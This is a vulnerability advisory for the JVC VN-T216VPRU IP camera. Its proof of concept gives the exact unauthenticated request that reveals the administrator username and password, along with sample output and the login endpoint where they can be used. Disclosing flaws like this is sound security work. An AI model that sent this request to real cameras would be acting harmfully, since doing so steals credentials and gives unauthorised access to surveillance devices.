@@ -1,0 +1,38 @@
+1. Advisory Information
+========================================
+Title                   : JVC IP-Camera (VN-T216VPRU) Remote Credentials Disclosure
+Vendor Homepage         : http://pro.jvc.com/
+Remotely Exploitable	: Yes
+Tested on Camera types	: VN-T216VPRU
+Product References      : http://pro.jvc.com/prof/attributes/features.jsp?model_id=MDL102145
+Vulnerability           : Username / Password Disclosure (Critical/High)
+Date                    : 19/08/2016
+Author                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
+ 
+ 
+2. CREDIT
+========================================
+This vulnerability was identified during penetration test by Yakir Wizman.
+  
+
+3. Description
+========================================
+JVC IP-Camera (VN-T216VPRU) allows to unauthenticated user disclose the username & password remotely by simple request which made by browser.
+
+
+4. Proof-of-Concept:
+========================================
+Simply go to the following url:
+http://host:port/cgi-bin/readfile.cgi?query=ADMINID
+
+Should return some javascript variable which contain the credentials and other configuration vars:
+var Adm_ID="admin"; var Adm_Pass1=“admin”; var Adm_Pass2=“admin”; var Language=“en”; var Logoff_Time="0"; 
+
+-----------------------------------------------
+
+Login @ http://host:port/cgi-bin/chklogin.cgi
+
+
+5. SOLUTION
+========================================
+Contact the vendor for further information regarding the proper mitigation of this vulnerability.
